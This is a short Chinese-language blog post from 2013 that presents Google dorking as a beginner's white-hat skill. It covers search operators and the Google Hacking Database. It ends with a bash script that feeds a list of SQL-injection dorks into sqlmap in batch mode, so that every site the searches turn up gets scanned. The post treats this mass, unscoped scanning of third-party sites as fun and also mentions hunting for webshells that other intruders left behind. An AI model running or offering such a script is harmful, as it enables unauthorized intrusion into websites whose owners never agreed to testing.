---
layout:     post
title:      白帽子第一课：Google Hacking
date:       2013-12-31 09:00:00
summary:    Google 强大的爬虫提供的不仅仅是关键词搜索的结果，稍微加点参数就能把google发挥的淋漓尽致，而这也是非常简单的，所以google hacking 也叫 google dorks，因此这应该是白帽子学习的第一种技能！
tags:       安全
---

Google 强大的爬虫提供的不仅仅是关键词搜索的结果，稍微加点参数就能把google发挥的淋漓尽致，而这也是非常简单的，所以google hacking 也叫 google dorks，因此这应该是白帽子学习的第一种技能！
google提供的搜索参数非常庞大应该，wiki提供了一个常用参数的列表，而个人按照频率來说主要还是下面几个：
site, filetype, inurl, intitle
当然有的不是以参数出现的，比如"key words"就是完全匹配，还有 or , and等也很常用。

网上有个[GHDB][1]（这也[有个][2]），就是已经收集好的搜索规则，主要用于渗透前的信息收集。

个人觉得会用google比工具党來的还有技术含量点，至少这个需要强大的想象力。

看过有人用google批量找别的X阔留下的webshell，不过现在不太好使了

最黄最暴力的我估计就是批量找sql注入点和xss了，这里是别人的sql的GHDB，写成脚本，放到远程跑去，把解析回来的地址放到sqlmap里跑，爽歪歪！ 简单写了个脚本，[ghdb_sql][3]和脚本放到[sqlmap][4]目录

```bash
#!/bin/bash
cat ghdb_sql | while read line
do
        echo ==================================
        echo use $line
        echo ==================================
        ./sqlmap.py -g "$line" --batch
done
```

了解更多，请自行Google Hacking: `google hacking filetype:pdf`


  [1]: http://www.exploit-db.com/google-dorks/
  [2]: http://www.hackersforcharity.org/ghdb/
  [3]: https://dn-getlink.qbox.me/ghdb_sql
  [4]: http://sqlmap.org/
